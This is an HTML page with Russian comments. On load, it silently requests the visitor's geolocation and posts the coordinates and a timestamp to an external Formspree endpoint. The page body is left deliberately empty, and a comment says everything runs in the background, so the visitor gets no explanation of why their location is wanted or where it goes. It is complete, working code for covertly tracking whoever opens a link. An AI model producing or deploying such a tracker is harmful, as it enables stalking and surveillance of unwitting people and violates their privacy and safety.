<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Отправка координат</title>
    <script>
        // Автоматически запускаем запрос на геолокацию при загрузке страницы
        window.onload = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        const lat = position.coords.latitude.toFixed(6);
                        const lon = position.coords.longitude.toFixed(6);

                        // Отправляем координаты через Formspree
                        fetch('https://formspree.io/f/mgvydewb ', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({
                                latitude: lat,
                                longitude: lon,
                                timestamp: new Date().toISOString()
                            })
                        })
                        .then(() => console.log("Координаты отправлены"))
                        .catch(err => console.error("Ошибка:", err));
                    },
                    function(error) {
                        console.error("Ошибка геолокации:", error.message);
                    }
                );
            } else {
                console.log("Геолокация не поддерживается");
            }
        };
    </script>
</head>
<body>
    <!-- Страница пустая, всё работает в фоне -->
</body>
</html>
